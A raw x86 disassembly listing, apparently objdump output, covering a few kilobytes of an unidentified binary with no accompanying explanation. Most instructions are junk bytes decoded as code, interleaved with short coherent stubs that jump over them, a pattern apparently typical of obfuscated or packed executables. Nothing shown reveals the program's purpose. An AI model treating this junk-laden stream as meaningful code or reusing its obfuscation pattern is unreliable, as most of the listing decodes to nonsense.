  402987:	and    BYTE PTR ds:0x6582031,cl
  40298d:	push   0xffffffd2
  40298f:	test   DWORD PTR [edx+0xb241bda],esp
  402995:	pusha  
  402996:	sub    ch,BYTE PTR [esi]
  402998:	out    dx,al
  402999:	dec    esp
  40299a:	pop    ecx
  40299b:	repz sub DWORD PTR [eax-0x19718974],eax
  4029a2:	dec    edi
  4029a3:	xor    dl,dl
  4029a5:	inc    esi
  4029a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029a7:	aaa    
  4029a8:	test   eax,0xff8ca24c
  4029ad:	or     al,0x1e
  4029af:	or     al,0xe5
  4029b1:	mov    ch,0xa3
  4029b3:	xor    al,0x4e
  4029b5:	sahf   
  4029b6:	mov    DWORD PTR ds:0x929362e9,ebx
  4029bc:	mov    ds:0x17f43fef,al
  4029c1:	inc    eax
  4029c2:	retf   
  4029c3:	dec    esp
  4029c4:	xor    BYTE PTR ds:0xe520f6bf,0xc6
  4029cb:	sub    ebp,DWORD PTR [ecx+0x5b29d613]
  4029d1:	sbb    DWORD PTR [ebx],ebx
  4029d3:	pop    edi
  4029d4:	push   ecx
  4029d5:	xchg   esp,eax
  4029d6:	dec    edx
  4029d7:	xchg   edi,eax
  4029d8:	jo     0x4029e3
  4029da:	(bad)  
  4029db:	fcomip st,st(4)
  4029dd:	ins    BYTE PTR es:[edi],dx
  4029de:	push   esi
  4029df:	mov    esp,0x8ba6fb04
  4029e4:	aas    
  4029e5:	dec    edx
  4029e6:	aad    0x9d
  4029e8:	inc    ebp
  4029e9:	leave  
  4029ea:	fs loop 0x4029e3
  4029ed:	xor    DWORD PTR [eax+0x42],esp
  4029f0:	xchg   ecx,eax
  4029f1:	push   ebx
  4029f2:	push   ebx
  4029f3:	fidiv  DWORD PTR [ecx+0x741352f2]
  4029f9:	lock scas al,BYTE PTR es:[edi]
  4029fb:	sub    al,0x3
  4029fd:	into   
  4029fe:	push   0xffffff97
  402a00:	pop    esp
  402a01:	retf   
  402a02:	and    al,0x54
  402a04:	add    dl,al
  402a06:	cmp    ebp,DWORD PTR [ebx]
  402a08:	scas   al,BYTE PTR es:[edi]
  402a09:	pop    esp
  402a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a0b:	jp     0x4029ed
  402a0d:	xchg   edx,eax
  402a0e:	mov    edx,0xc6588271
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	call   0xaa4b0c6d
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	fidivr DWORD PTR [esi+edx*2]
  402a43:	es jbe 0x4029e9
  402a46:	xchg   esp,eax
  402a47:	xchg   ebp,eax
  402a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a49:	fsub   DWORD PTR [ebx+0x71948d56]
  402a4f:	jle    0x4029f4
  402a51:	shl    ecx,cl
  402a53:	xchg   BYTE PTR [edx-0x3b2cc937],ch
  402a59:	gs push esi
  402a5b:	cmp    DWORD PTR [esi+ecx*2+0x25],ecx
  402a5f:	push   edi
  402a60:	lea    edx,[edx+0x30ec4f30]
  402a66:	push   0x1b8e5580
  402a6b:	test   eax,0x73cd61cb
  402a70:	inc    esi
  402a71:	aas    
  402a72:	pop    esp
  402a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a74:	xchg   ecx,eax
  402a75:	and    al,0x3b
  402a77:	into   
  402a78:	jne    0x402ae6
  402a7a:	addr16 (bad) 
  402a7d:	dec    ebx
  402a7e:	sub    ebp,esp
  402a80:	fwait
  402a81:	cmp    al,0x42
  402a83:	mov    ds:0xc39cf47b,al
  402a88:	jbe    0x402a20
  402a8a:	and    ebp,DWORD PTR ds:[eax]
  402a8d:	cs jecxz 0x402a32
  402a90:	ss xchg edi,eax
  402a92:	ins    BYTE PTR es:[edi],dx
  402a93:	xchg   ecx,eax
  402a94:	jnp    0x402aa5
  402a96:	ror    dh,1
  402a98:	ja     0x402a6a
  402a9a:	add    ch,0xdf
  402a9d:	sub    dl,ah
  402a9f:	add    dl,BYTE PTR ds:0xa69c5520
  402aa5:	aaa    
  402aa6:	fsubrp st(0),st
  402aa8:	push   ebp
  402aa9:	rcr    ecx,1
  402aab:	mov    edi,0xf2210124
  402ab0:	ins    DWORD PTR es:[edi],dx
  402ab1:	pop    ss
  402ab2:	retf   
  402ab3:	jno    0x402a69
  402ab5:	(bad)  
  402ab6:	leave  
  402ab7:	data16 jae 0x402acc
  402aba:	gs or  esp,ecx
  402abd:	test   eax,0x37f22e44
  402ac2:	lods   al,BYTE PTR ds:[esi]
  402ac3:	xchg   ebp,eax
  402ac4:	mov    edx,DWORD PTR [edi-0x57]
  402ac7:	aad    0x74
  402ac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aca:	mov    eax,0x27d23379
  402acf:	push   es
  402ad0:	sub    DWORD PTR [esi+0x8f9a34e],0xffffffd1
  402ad7:	inc    edi
  402ad8:	jmp    0x402adf
  402ada:	xor    cl,BYTE PTR [eax-0x5907bdb7]
  402ae0:	push   ss
  402ae1:	test   BYTE PTR [ecx+0x41458b51],ch
  402ae7:	ins    BYTE PTR es:[edi],dx
  402ae8:	in     al,dx
  402ae9:	pusha  
  402aea:	xchg   esp,eax
  402aeb:	sbb    ah,BYTE PTR [esi+0x5f]
  402aee:	sbb    edi,DWORD PTR [ecx]
  402af0:	push   0xffffffcf
  402af2:	pop    eax
  402af3:	rcr    DWORD PTR [esi-0x63af9fad],0xd7
  402afa:	clc    
  402afb:	pop    ebx
  402afc:	add    al,0x40
  402afe:	repz inc ecx
  402b00:	(bad)  
  402b01:	popa   
  402b02:	jecxz  0x402b74
  402b04:	cmp    DWORD PTR [edi+0x65],eax
  402b07:	stos   BYTE PTR es:[edi],al
  402b08:	mov    al,0x14
  402b0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b0b:	push   ecx
  402b0c:	or     DWORD PTR [edi+0xc],esp
  402b0f:	out    dx,eax
  402b10:	in     eax,dx
  402b11:	pop    esi
  402b12:	mov    BYTE PTR [ebx+0x66bf5a06],ch
  402b18:	sbb    DWORD PTR [edx+0x39b1d797],ecx
  402b1e:	mov    edi,0xb2ae3634
  402b23:	and    BYTE PTR [edi],bh
  402b25:	dec    ecx
  402b26:	lock pop eax
  402b28:	les    ebx,FWORD PTR [edi]
  402b2a:	pop    eax
  402b2b:	in     eax,dx
  402b2c:	push   ecx
  402b2d:	jae    0x402bae
  402b2f:	mov    ah,0x24
  402b31:	aaa    
  402b32:	cwde   
  402b33:	mov    ah,0xd6
  402b35:	or     DWORD PTR [ebx],edx
  402b37:	lock jg 0x402b37
  402b3a:	loop   0x402b81
  402b3c:	into   
  402b3d:	ret    
  402b3e:	adc    eax,0x4bb4a7bc
  402b43:	clc    
  402b44:	pop    ecx
  402b45:	mov    ds:0xbba61be7,eax
  402b4a:	xchg   DWORD PTR [edx-0x4591ff6b],ebp
  402b50:	out    dx,al
  402b51:	test   eax,0x94e1d8c4
  402b56:	js     0x402af9
  402b58:	sub    edx,DWORD PTR [ebp-0x34be6f6]
  402b5e:	add    BYTE PTR [ebx+eiz*8-0x19],dl
  402b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b63:	jns    0x402b19
  402b65:	int    0xaf
  402b67:	pusha  
  402b68:	mov    bh,0xaf
  402b6a:	cmp    ecx,edx
  402b6c:	aam    0xc8
  402b6e:	add    al,0x2c
  402b70:	sbb    DWORD PTR [eax],ebp
  402b72:	dec    ebx
  402b73:	xchg   ecx,eax
  402b74:	bswap  eax
  402b76:	pusha  
  402b77:	mov    ch,0x49
  402b79:	ja     0x402b88
  402b7b:	lods   eax,DWORD PTR ds:[esi]
  402b7c:	je     0x402b1d
  402b7e:	outs   dx,WORD PTR ds:[esi]
  402b80:	pop    esi
  402b81:	push   0xa029b2a2
  402b86:	imul   edi,DWORD PTR [edi],0x92da0023
  402b8c:	mov    ch,0xa7
  402b8e:	rcl    BYTE PTR [ebx],cl
  402b90:	add    eax,0xff819a35
  402b95:	and    al,bl
  402b97:	and    ah,cl
  402b99:	inc    ebx
  402b9a:	push   edx
  402b9b:	mov    ah,0xa2
  402b9d:	mov    cl,BYTE PTR [esi+0x6]
  402ba0:	cmp    BYTE PTR [edi+0x3f],bl
  402ba3:	ror    esp,1
  402ba5:	dec    edx
  402ba6:	popa   
  402ba7:	xchg   DWORD PTR [ebp+0x2d33dff],esp
  402bad:	inc    ecx
  402bae:	inc    esi
  402baf:	jne    0x402bc9
  402bb1:	dec    edx
  402bb2:	xor    eax,0x96aa5c4e
  402bb7:	sub    DWORD PTR [ebx-0x60],ebp
  402bba:	or     eax,0xd9af8214
  402bbf:	outs   dx,BYTE PTR ds:[esi]
  402bc0:	inc    edi
  402bc1:	add    BYTE PTR [edi+0xfc08547],cl
  402bc7:	test   BYTE PTR [eax],ch
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	add    BYTE PTR [ebp-0x977b],cl
  402bd1:	call   DWORD PTR [eax-0x75]
  402bd4:	inc    ebp
  402bd5:	in     al,0x33
  402bd7:	mov    BYTE PTR [ebx],0xc7
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	xchg   edx,eax
  402c12:	cld    
  402c13:	loopne 0x402bb3
  402c15:	or     edi,DWORD PTR ss:[esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c85
  402c1e:	sbb    DWORD PTR [eax],esi
  402c20:	push   edx
  402c21:	cwde   
  402c22:	jb     0x402c5f
  402c24:	push   esi
  402c25:	std    
  402c26:	test   eax,0xf7a97328
  402c2b:	(bad)  
  402c2c:	sub    ch,ah
  402c2e:	cdq    
  402c2f:	gs jbe 0x402c19
  402c32:	scas   al,BYTE PTR es:[edi]
  402c33:	sar    edi,1
  402c35:	jecxz  0x402bbf
  402c37:	out    dx,al
  402c38:	fsubr  DWORD PTR [eax+ebp*4-0x78394841]
  402c3f:	jmp    0x402c8a
  402c41:	mov    ebp,0x838f36db
  402c46:	and    al,0x5b
  402c48:	lea    esi,es:0x10721aed
  402c4f:	rcr    DWORD PTR [edx+esi*4+0x72731287],0x1c
  402c57:	sbb    al,0x53
  402c59:	pop    es
  402c5a:	dec    edx
  402c5b:	dec    esp
  402c5c:	daa    
  402c5d:	mov    ah,0xa0
  402c5f:	add    al,0xe4
  402c61:	sub    edi,ebx
  402c63:	stc    
  402c64:	jb     0x402c35
  402c66:	cmp    DWORD PTR fs:[esi],0x44
  402c6a:	imul   ebp,DWORD PTR [ebx+0x4a9a97e0],0x61
  402c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c72:	mov    esp,0x3821b42f
  402c77:	(bad)  
  402c78:	fldenv [ebx]
  402c7a:	mov    edx,0xc6cc13ae
  402c7f:	in     eax,dx
  402c80:	arpl   WORD PTR [eax],cx
  402c82:	lods   al,BYTE PTR ds:[esi]
  402c83:	stos   DWORD PTR es:[edi],eax
  402c84:	aam    0xa3
  402c86:	jl     0x402cc8
  402c88:	lods   al,BYTE PTR ds:[esi]
  402c89:	fs push 0xfa00f42d
  402c8f:	sbb    ebx,0x6
  402c92:	xor    DWORD PTR [eax-0x69],edi
  402c95:	xor    BYTE PTR [edi],0x84
  402c98:	mov    ds:0x153d9e8d,eax
  402c9d:	fbld   TBYTE PTR [eax+0x15cb45af]
  402ca3:	mov    esi,0x36b135d9
  402ca8:	xchg   esp,eax
  402ca9:	daa    
  402caa:	retf   
  402cab:	mov    DWORD PTR [edi],esp
  402cad:	xchg   esp,eax
  402cae:	outs   dx,DWORD PTR ds:[esi]
  402caf:	xchg   esi,eax
  402cb0:	mov    WORD PTR ds:0x8465fee1,cs
  402cb6:	jp     0x402ca3
  402cb8:	mov    esi,0x810c192b
  402cbd:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cbf:	push   ss
  402cc0:	les    ecx,FWORD PTR [esi+0x58]
  402cc3:	sbb    esi,DWORD PTR [esi]
  402cc5:	ds int 0x3b
  402cc8:	imul   ebp,DWORD PTR [edx+0xd],0x95e105ef
  402ccf:	pusha  
  402cd0:	sahf   
  402cd1:	pop    eax
  402cd2:	shr    BYTE PTR [edx-0x55],0x31
  402cd6:	out    0x49,al
  402cd8:	xchg   esp,eax
  402cd9:	(bad)
  402cdd:	stc    
  402cde:	push   0x7d
  402ce0:	in     eax,dx
  402ce1:	enter  0xa861,0x2c
  402ce5:	mov    ds:0x4d107017,eax
  402cea:	cld    
  402ceb:	adc    al,0x6e
  402ced:	and    eax,0xab352477
  402cf2:	(bad)  
  402cf3:	nop
  402cf4:	ss mov ah,0xbc
  402cf7:	inc    ecx
  402cf8:	fnstenv [ebp+0xc]
  402cfb:	mov    cl,0x60
  402cfd:	test   BYTE PTR [esi+0x21],dh
  402d00:	stc    
  402d01:	add    bh,ch
  402d03:	jae    0x402ce9
  402d05:	popf   
  402d06:	dec    edi
  402d07:	push   edi
  402d08:	push   0x48e4fbff
  402d0d:	pop    ebp
  402d0e:	sbb    BYTE PTR [esi+eax*2+0x6d],dl
  402d12:	fdivr  DWORD PTR [eax+0x51538307]
  402d18:	mov    eax,0x684de3e7
  402d1d:	dec    esp
  402d1e:	push   0x6808909e
  402d23:	fild   WORD PTR [edx-0x1e]
  402d26:	mov    dh,0x4d
  402d28:	and    cl,BYTE PTR [ecx+0x67393e7]
  402d2e:	fist   WORD PTR [ebp-0x110aa5c9]
  402d34:	adc    ch,0x57
  402d37:	mov    dh,0xad
  402d39:	or     eax,0xf91d0ca
  402d3e:	push   0x35
  402d40:	(bad)  
  402d41:	(bad)  
  402d42:	(bad)  
  402d43:	sets   BYTE PTR [ebp+0x58]
  402d47:	mov    bh,BYTE PTR ds:0xb054cfc2
  402d4d:	es mov ah,0x71
  402d50:	pop    ebp
  402d51:	out    dx,eax
  402d52:	and    BYTE PTR [esi],0xc2
  402d55:	retf   
  402d56:	jne    0x402da1
  402d58:	jbe    0x402da4
  402d5a:	ret    0xf866
  402d5d:	sbb    DWORD PTR [ecx+0x6b],esi
  402d60:	or     dl,BYTE PTR ds:[eax]
  402d63:	idiv   BYTE PTR [esi+0x65278ca1]
  402d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d6a:	sbb    ch,BYTE PTR [edi+0x5]
  402d6d:	add    DWORD PTR [ebp-0x61ed25e6],edi
  402d73:	sbb    esp,DWORD PTR [edi]
  402d75:	bound  esp,QWORD PTR [edx+eax*1+0xdeeaa50]
  402d7c:	and    al,0xc6
  402d7e:	lahf   
  402d7f:	(bad)  
  402d80:	int    0x8b
  402d82:	fwait
  402d83:	cdq    
  402d84:	outs   dx,DWORD PTR ds:[esi]
  402d85:	in     al,0x5d
  402d87:	in     al,dx
  402d88:	fcom   st(5)
  402d8a:	fsubr  DWORD PTR [edx-0x1e]
  402d8d:	fcomp  DWORD PTR [esi-0x7c872751]
  402d93:	cld    
  402d94:	sbb    ah,BYTE PTR es:[esi+ebp*2-0x3a]
  402d99:	movlhps xmm4,xmm1
  402d9c:	or     BYTE PTR [esi],bl
  402d9e:	push   eax
  402d9f:	cdq    
  402da0:	ja     0x402dcd
  402da2:	inc    ebp
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [esp+ebp*2+0x3c],1
  402de7:	(bad)  [esi+0x7e7e08b2]
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402d76
  402df2:	daa    
  402df3:	inc    esp
  402df4:	inc    esp
  402df5:	call   0x4693903d
  402dfa:	ins    BYTE PTR es:[edi],dx
  402dfb:	mov    ch,0x3
  402dfd:	lods   al,BYTE PTR ds:[esi]
  402dfe:	xchg   ebx,eax
  402dff:	out    dx,eax
  402e00:	cld    
  402e01:	inc    edi
  402e02:	(bad)  
  402e03:	hlt    
  402e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e05:	hlt    
  402e06:	or     al,0x5d
  402e08:	add    eax,0x5468adf1
  402e0d:	(bad)  
  402e0e:	sahf   
  402e0f:	mov    ?,WORD PTR [eax-0x237297f5]
  402e15:	neg    BYTE PTR [eax-0x5b0ebb4a]
  402e1b:	add    edi,edi
  402e1d:	aaa    
  402e1e:	int3   
  402e1f:	fcom   DWORD PTR [edx+edx*1]
  402e22:	mov    bh,BYTE PTR [ecx+0x497e6ca3]
  402e28:	jecxz  0x402dce
  402e2a:	push   edi
  402e2b:	icebp  
  402e2c:	es jge 0x402eaa
  402e2f:	cmp    al,BYTE PTR [ecx]
  402e31:	aaa    
  402e32:	fldcw  WORD PTR [ecx-0x5cd79ef4]
  402e38:	mov    edi,0xd4eaeb85
  402e3d:	adc    BYTE PTR [edx+0x2e4ac4f7],0x49
  402e44:	cmp    BYTE PTR [ecx],bh
  402e46:	sti    
  402e47:	loop   0x402e46
  402e49:	jae    0x402e5a
  402e4b:	int    0xb1
  402e4d:	xor    BYTE PTR [edx-0x5f947491],ah
  402e53:	pop    ebp
  402e54:	retf   
  402e55:	push   eax
  402e56:	cmovle esp,DWORD PTR [edx+0x69]
  402e5a:	push   esp
  402e5b:	jmp    0x5ed62e3b
  402e60:	jnp    0x402e2c
  402e62:	xchg   esp,eax
  402e63:	ds xchg ebx,eax
  402e65:	aad    0x2f
  402e67:	ret    0xb721
  402e6a:	(bad)  
  402e6b:	call   FWORD PTR [ebx]
  402e6d:	mov    DWORD PTR [ebp-0x38de684d],ebx
  402e73:	inc    ebp
  402e74:	retf   
  402e75:	mov    ch,0xb5
  402e77:	add    BYTE PTR [edi-0x44251309],dh
  402e7d:	mov    bl,0x64
  402e7f:	test   al,0xe5
  402e81:	call   0x5560c6e1
  402e86:	xlat   BYTE PTR ds:[ebx]
  402e87:	cli    
  402e88:	add    al,0x9b
  402e8a:	jle    0x402e47
  402e8c:	sti    
  402e8d:	ss sub al,0xb0
  402e90:	clc    
  402e91:	inc    eax
  402e92:	jo     0x402e44
  402e94:	data16 fimul DWORD PTR [edx]
  402e97:	jb     0x402e3a
  402e99:	cli    
  402e9a:	repz sbb al,0xec
  402e9d:	dec    esi
  402e9e:	xchg   DWORD PTR [edx],ecx
  402ea0:	ss sahf 
  402ea2:	(bad)  
  402ea3:	out    dx,eax
  402ea4:	fldl2e 
  402ea6:	retf   
  402ea7:	push   0xffffffe5
  402ea9:	jns    0x402e52
  402eab:	sbb    DWORD PTR [eax+0x288aaece],0x71ad6150
  402eb5:	lea    edx,[ebx+0x492543bb]
  402ebb:	arpl   WORD PTR [edi-0x29cc68d6],cx
  402ec1:	pusha  
  402ec2:	inc    ecx
  402ec3:	and    BYTE PTR [edx+edi*8],bl
  402ec6:	or     ecx,eax
  402ec8:	jmp    0xf158:0x54d526ec
  402ecf:	stos   DWORD PTR es:[edi],eax
  402ed0:	arpl   WORD PTR [edx-0x25fc78ae],bp
  402ed6:	imul   esi,edx,0x3ed9df46
  402edc:	xchg   ecx,eax
  402edd:	pop    ss
  402ede:	mov    bl,0xc6
  402ee1:	inc    edx
  402ee2:	mov    dh,0x52
  402ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ee5:	call   0x8a703f0d
  402eea:	push   ds
  402eeb:	gs je  0x402f02
  402eee:	test   eax,0x44a20e15
  402ef3:	lds    edi,FWORD PTR [eax]
  402ef5:	mov    ds:0x69e135cf,eax
  402efa:	add    eax,0x6acef061
  402eff:	ret    
  402f00:	into   
  402f01:	mov    BYTE PTR [eax+0x6d],ch
  402f04:	aaa    
  402f05:	pop    esi
  402f06:	fs out 0x9d,al
  402f09:	mov    al,0xc6
  402f0b:	cdq    
  402f0c:	jns    0x402f4e
  402f0e:	inc    esp
  402f0f:	inc    ecx
  402f10:	pop    ss
  402f11:	cs push ebx
  402f13:	cmp    eax,0xe5797e80
  402f18:	pop    edi
  402f19:	push   ds
  402f1a:	mov    ch,0x74
  402f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f1d:	loop   0x402f91
  402f1f:	iret   
  402f20:	enter  0x98a0,0x84
  402f24:	sub    esp,DWORD PTR [edi+0xd]
  402f27:	or     eax,0xeecb742
  402f2c:	js     0x402ec8
  402f2e:	retf   
  402f2f:	push   ss
  402f30:	add    eax,0x70907059
  402f35:	mov    ebx,0xbb6c45f7
  402f3a:	dec    BYTE PTR fs:0x3e738b6a
  402f41:	mov    ebx,ecx
  402f43:	sbb    al,dl
  402f45:	repnz cmp cl,al
  402f48:	lock mov cl,0x17
  402f4b:	jne    0x402f45
  402f4d:	jbe    0x402fab
  402f4f:	or     esi,DWORD PTR [esi]
  402f51:	test   eax,0x92b8d55a
  402f56:	cmp    BYTE PTR [eax+0x4a1b785],ah
  402f5c:	les    ebp,FWORD PTR [ebx]
  402f5e:	adc    BYTE PTR [ebp-0x43],bh
  402f61:	jne    0x402efc
  402f63:	xor    ah,BYTE PTR [ebp+0x66]
  402f66:	(bad)  
  402f67:	cli    
  402f68:	sbb    eax,0xe03242c2
  402f6d:	push   0xe63ef9cb
  402f72:	jl     0x402f65
  402f74:	in     eax,dx
  402f75:	lea    eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x11005a49]
  402fae:	mov    eax,ds:0x7e163e68
  402fb3:	jle    0x402faf
  402fb5:	jg     0x403035
  402fb7:	jle    0x40300c
  402fb9:	stc    
  402fba:	xchg   edi,eax
  402fbb:	inc    esp
  402fbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fbd:	leave  
  402fbe:	inc    ebx
  402fbf:	mov    ecx,0x576d07a8
  402fc4:	and    al,0x6b
  402fc6:	add    ecx,DWORD PTR [ecx+0x7]
  402fc9:	adc    esp,eax
  402fcb:	pop    eax
  402fcc:	iret   
  402fcd:	jmp    0x402fd8
  402fcf:	mov    bl,0x7f
  402fd1:	and    DWORD PTR [edi+0x52],esp
  402fd4:	pop    edi
  402fd5:	mov    bl,0x79
  402fd7:	cdq    
  402fd8:	jo     0x402f85
  402fda:	adc    ecx,DWORD PTR [edi-0x4f4dae98]
  402fe0:	jb     0x403005
  402fe2:	jg     0x403014
  402fe4:	sbb    bh,BYTE PTR [eax]
  402fe6:	sub    ebx,DWORD PTR [ebp+0x2e908060]
  402fec:	inc    edi
  402fed:	leave  
  402fee:	add    eax,0xb2483274
  402ff3:	cld    
  402ff4:	test   eax,0x6dc0e085
  402ff9:	lods   al,BYTE PTR ds:[esi]
  402ffa:	xchg   ebp,eax
  402ffb:	inc    ebx
  402ffc:	fcmovne st,st(3)
  402ffe:	stc    
  402fff:	pop    ss
  403000:	dec    ebp
  403001:	jmp    0xc2a2:0x38dc25de
  403008:	pop    esp
  403009:	add    dh,BYTE PTR [ebx]
  40300b:	push   ebx
  40300c:	push   es
  40300d:	xor    al,0xad
  40300f:	out    0x7e,al
  403011:	pop    esi
  403012:	mov    dh,0xb
  403014:	(bad)  
  403015:	push   edi
  403016:	aaa    
  403017:	inc    eax
  403018:	xchg   ebx,eax
  403019:	xchg   dl,ah
  40301b:	jne    0x402fad
  40301d:	out    dx,eax
  40301e:	shl    esi,cl
  403020:	xor    ecx,DWORD PTR [ebp-0x5e111b2b]
  403026:	sbb    ebx,DWORD PTR [ebx+0x3b]
  403029:	pop    ebp
  40302a:	cli    
  40302b:	inc    ebp
  40302c:	add    ebx,DWORD PTR ds:0x1a3199be
  403032:	lods   al,BYTE PTR ds:[esi]
  403033:	jo     0x402ff5
  403035:	jle    0x402ff7
  403037:	and    dl,cl
  403039:	(bad)  
  40303a:	inc    DWORD PTR [edx+0x73d2e0ce]
  403040:	inc    eax
  403041:	lods   al,BYTE PTR ds:[esi]
  403042:	inc    ebx
  403043:	js     0x402fc5
  403045:	mov    edx,0xbbd41d86
  40304a:	xabort 0xb3
  40304d:	cmp    DWORD PTR [ecx-0x1359383],esp
  403053:	outs   dx,BYTE PTR ds:[esi]
  403054:	das    
  403055:	(bad)  
  403056:	int3   
  403057:	call   0xbd17f03e
  40305c:	xchg   ecx,eax
  40305d:	out    dx,al
  40305e:	add    BYTE PTR [edx+edx*8],al
  403061:	push   ecx
  403062:	push   esp
  403063:	push   cs
  403064:	es cmp eax,0x52ebd1fc
  40306a:	shl    esp,1
  40306c:	sti    
  40306d:	xchg   ecx,esi
  40306f:	data16 in al,dx
  403071:	imul   esp,DWORD PTR ds:0xfc67eab4,0xffffffb5
  403078:	pop    edx
  403079:	fsubr  DWORD PTR [ecx+0x3507d830]
  40307f:	ins    BYTE PTR es:[edi],dx
  403080:	mov    ?,WORD PTR [edi-0x54]
  403083:	ins    DWORD PTR es:[edi],dx
  403084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403085:	cli    
  403086:	test   al,0x36
  403088:	mul    BYTE PTR [edx-0x6e]
  40308b:	ret    0xa565
  40308e:	mov    ds:0xb68df8,eax
  403093:	dec    ecx
  403094:	pop    ecx
  403095:	out    0x93,eax
  403097:	lds    edx,FWORD PTR es:[ebp+0x65]
  40309b:	shl    BYTE PTR [edi+0x178e5c62],0x0
  4030a2:	jl     0x4030ec
  4030a4:	jp     0x4030a8
  4030a6:	fsub   DWORD PTR [eax+0x7e]
  4030a9:	cli    
  4030aa:	mov    ebp,0x43d707d2
  4030af:	mov    bl,0x2d
  4030b1:	das    
  4030b2:	lock idiv DWORD PTR [esi]
  4030b5:	adc    ecx,DWORD PTR ds:0xf90a6451
  4030bb:	test   ecx,0x4707e8a0
  4030c1:	xor    ebx,0xe9178da
  4030c7:	push   0x4cea9e8b
  4030cc:	scas   al,BYTE PTR es:[edi]
  4030cd:	inc    BYTE PTR [ecx-0x5b]
  4030d0:	into   
  4030d1:	jnp    0x4030f2
  4030d3:	out    dx,eax
  4030d4:	push   edx
  4030d5:	push   ecx
  4030d6:	jae    0x4030be
  4030d8:	(bad)
  4030dc:	addr16 mov cs:0x306c,al
  4030e1:	mov    ?,WORD PTR [ebx+0x752d861b]
  4030e7:	fcomp  DWORD PTR [edx]
  4030e9:	sahf   
  4030ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030eb:	jp     0x40310b
  4030ed:	sub    dl,bl
  4030ef:	enter  0x21e,0x48
  4030f3:	mov    al,0x90
  4030f5:	mov    ebx,0x3be20f2
  4030fa:	dec    eax
  4030fb:	pushf  
  4030fc:	xor    eax,DWORD PTR [esi+0x1d]
  4030ff:	add    al,0x4f
  403101:	xor    bh,BYTE PTR [ebx+0x5278a021]
  403107:	dec    si
  403109:	rcr    DWORD PTR [edi-0x33],cl
  40310c:	data16 sub bh,BYTE PTR [esi]
  40310f:	mov    ebx,DWORD PTR [edi-0x36]
  403112:	pop    ebx
  403113:	pop    edi
  403114:	xchg   dl,cl
  403116:	sbb    esi,DWORD PTR [edi+0x563219ba]
  40311c:	into   
  40311d:	aas    
  40311e:	adc    edx,DWORD PTR [edi-0x58]
  403121:	inc    edi
  403122:	sbb    al,0x74
  403124:	cld    
  403125:	mov    ah,0x89
